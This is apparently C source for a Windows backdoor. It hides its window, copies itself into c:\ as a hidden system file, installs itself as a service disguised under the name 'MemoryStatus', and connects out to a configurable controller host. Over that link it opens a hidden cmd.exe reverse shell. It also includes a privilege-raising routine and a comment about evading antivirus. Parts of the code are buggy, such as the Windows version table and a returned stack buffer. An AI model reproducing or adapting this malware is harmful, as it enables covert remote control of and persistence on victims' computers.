#include <stdio.h>
#include<WinSock2.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>



#pragma comment(lib, "ws2_32.lib")


#pragma warning(disable: 4996) // avoid GetVersionEx to be warned

// int WINAPI MessageBox(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);

char const address[] = "12345678987654321";
char const port[] = "999999999";
char const sign[10] = "customize";
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
struct CMSG{
        char sign[10];
        int mod;//自定义模式
        int msg_l;
};


//-------------------------SYSTEM INFOMATION START---------------------------------------------------
char* getIpAddress(){
    WSADATA wsaData;
    char name[255];//定义用于存放获得的主机名的变量 
    char *ip;//定义IP地址变量 
    PHOSTENT hostinfo;
    if ( WSAStartup( MAKEWORD(2,0), &wsaData ) == 0 ) {
        if( gethostname ( name, sizeof(name)) == 0) {
            if((hostinfo = gethostbyname(name)) != NULL) {
                ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
            }
        }
    }
    return ip;
}
char* getOsInfo()
{
	// get os name according to version number
	OSVERSIONINFO osver = { sizeof(OSVERSIONINFO) };
	GetVersionEx(&osver);
	char *os_name;
	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)
		os_name = "Windows 2000";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 1)
		os_name = "Windows XP";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 0)
		os_name = "Windows 2003";
	else if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 2)
		os_name = "windows vista";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 1)
		os_name = "windows 7";
	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2)
		os_name = "windows 10";
    return os_name;
}
char* getMemoryInfo()
{
    #define  GBYTES  1073741824  
    #define  MBYTES  1048576  
    #define  KBYTES  1024  
    #define  DKBYTES 1024.0 
    #define kMaxInfoBuffer 256

	char* memory_info;
	MEMORYSTATUSEX statusex;
	statusex.dwLength = sizeof(statusex);
	if (GlobalMemoryStatusEx(&statusex))
	{
		unsigned long long total = 0, remain_total = 0, avl = 0, remain_avl = 0;
		double decimal_total = 0, decimal_avl = 0;
		remain_total = statusex.ullTotalPhys % GBYTES;
		total = statusex.ullTotalPhys / GBYTES;
		avl = statusex.ullAvailPhys / GBYTES;
		remain_avl = statusex.ullAvailPhys % GBYTES;
		if (remain_total > 0)
			decimal_total = (remain_total / MBYTES) / DKBYTES;
		if (remain_avl > 0)
			decimal_avl = (remain_avl / MBYTES) / DKBYTES;
 
		decimal_total += (double)total;
		decimal_avl += (double)avl;
		char  buffer[kMaxInfoBuffer];
		sprintf(buffer, "total %.2f GB (%.2f GB available)", decimal_total, decimal_avl);
		memory_info = buffer;
        printf(memory_info);
        return memory_info;
	}
	
}
//-------------------------SYSTEM INFOMATION END-----------------------------------------------------

void BackDoor(SOCKET sock){
    
    
    int ret;
    char Buff[1024]; 
    SECURITY_ATTRIBUTES pipeattr1,pipeattr2; 
    HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
    pipeattr1.nLength=12; 
    pipeattr1.lpSecurityDescriptor=0; 
    pipeattr1.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0); 
    pipeattr2.nLength=12; 
    pipeattr2.lpSecurityDescriptor=0; 
    pipeattr2.bInheritHandle=TRUE; 
    CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0); 
    STARTUPINFO si; 
    ZeroMemory(&si,sizeof(si)); 
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    si.wShowWindow=SW_HIDE; 
    si.hStdInput=hReadPipe2; 
    si.hStdOutput=si.hStdError=hWritePipe1; 
    char cmdline[]="cmd.exe"; 
    PROCESS_INFORMATION ProcessInformation; 
    ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation); 

    unsigned long lBytesRead; 
    while (1) 
    { 
        
        ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0); 
        if (lBytesRead) 
        { 
            
            ret=ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            ret=send(sock,Buff+'\0',lBytesRead,0);

            if (ret<=0) break; 
        } else { 
            lBytesRead=recv(sock,Buff,1024,0); 
            

            if (lBytesRead<=0 || Buff == "reset") break;//没数据or服务器退出(mod:1) 
            ret=WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
            if (!ret) break; 
            if (ret<=0)break;
            // Sleep(600);
        }
    }
    return;
}

//提升进程权限
void AdvanceProcess(){
    HANDLE hdlTokenHandle;
    HANDLE hdlProcessHandle = GetCurrentProcess();
    LUID tmpLuid;
    TOKEN_PRIVILEGES tkp;
    TOKEN_PRIVILEGES tkpNewButIgnored;
    if(!OpenProcessToken(hdlProcessHandle,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hdlTokenHandle)){
        CloseHandle(hdlTokenHandle);
        return;
    }
    if (!LookupPrivilegeValueA("",SE_DEBUG_NAME,&tmpLuid)){
        CloseHandle(hdlTokenHandle);
        return;
    }
    tkp.PrivilegeCount=1;
    tkp.Privileges[0].Luid = tmpLuid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hdlTokenHandle, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {  
        CloseHandle(hdlTokenHandle);  
        return ;  
    } 

}

void Handle(){
    WSADATA WSAData;
    SOCKET sock; 

    SOCKADDR_IN addr_in;
    

    
    WSAStartup(MAKEWORD(2,2),&WSAData); 

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(atoi(port)); 
    addr_in.sin_addr.S_un.S_addr=inet_addr(address);
 
    sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    
    if (WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR) {
        return;
    }
    while (TRUE){
        char * address = malloc(sizeof(struct CMSG));
        int ret = recv(sock,address,sizeof(struct CMSG),0);
        struct CMSG msg = *(struct CMSG*)address;
        free(address);
        if(ret == -1){
            continue;
        }
        switch (msg.mod){
            case 0:
                {struct CMSG msg = {
                .sign =  "customize",
                .mod = 0,
                .msg_l = 0
             };}
                ret = send(sock,(char*)&msg,sizeof(struct CMSG),0);//心跳包
                continue;
            case 1:
                // CMD命令
                BackDoor(sock);
            

        }
        
        

    }
}
void Init(){

    CreateEventA(0,FALSE,FALSE,"MemoryStatus");
    while(1){
        Handle();
        //这里可以把Sleep替换成其他检测方式已绕过杀软检测
    }
}

void WINAPI ServiceMain(DWORD dwArgc,  LPTSTR* lpszArgv){
    DWORD dwThreadId;
    // WriteToLog("Running..");
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler("MemoryStatus",
                     BDHandler))) return;
    ServiceStatus.dwServiceType  = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState  = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted  = SERVICE_ACCEPT_STOP
                      | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode        = 0;
    ServiceStatus.dwCheckPoint            = 0;
    ServiceStatus.dwWaitHint              = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint   = 0;
    ServiceStatus.dwWaitHint     = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    Init();
}


void WINAPI BDHandler(DWORD dwControl)
{
 switch(dwControl)
 {
    case SERVICE_CONTROL_STOP:
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		break;
    default:
        break;
 }
}

void ServiceInstall(BOOL exits){
    char  szPath[MAX_PATH];
    char  target[MAX_PATH] = "c:\\";
    char  tar_path[MAX_PATH];
    char  Direectory[MAX_PATH];
    char  cmd[255];
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (OpenEventA(2031619,FALSE,"MemoryStatus") != 0 ){
        return ;
    }
    // AdvanceProcess();
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (char*)"MemoryStatus";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable); 
    // if ( !GetEnvironmentVariable("WINDIR", (LPSTR)target, MAX_PATH) ) return 1;
    
    if( !GetModuleFileName( NULL, (LPSTR)szPath, MAX_PATH ) ) return ;
    if(!GetCurrentDirectory(MAX_PATH,Direectory)) return ;
    // printf("Direectory:%s\nszPath:%s\ntarget:%s\n",Direectory,szPath,target);
    if (strcmp(Direectory,target) != 0 ){
        //判断是否在windows目录下
        strcat(target,"\\csrse.exe");
        // printf(target);
        CopyFile(szPath,target,TRUE);
        sprintf(cmd,"sc create MemoryStatus binPath= %s",target);
        // ShellExecuteA(NULL,"open","sc.exe",cmd,"",SW_HIDE);
        // ShellExecuteA(NULL,"open","sc.exe","start MemoryStatus","",SW_HIDE);
        system(cmd);
        sprintf(cmd,"attrib +s +a +h +r %s",target);
        system(cmd);
        system("sc start MemoryStatus");
        if (exits){
            system(target);
            exit(0);
        }
        
        return ;
     }
    // printf("\nRun");
}
void WriteRegedits(){
    
}
int _stdcall WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nCmdShow
)
{
    
    // Init();
    char * data;
    data = getIpAddress();
    printf("%s\n",data);
    data = getMemoryInfo();
    printf("%s\n",data);
    data = getOsInfo();
    printf("%s\n",data);
    return 0;
}
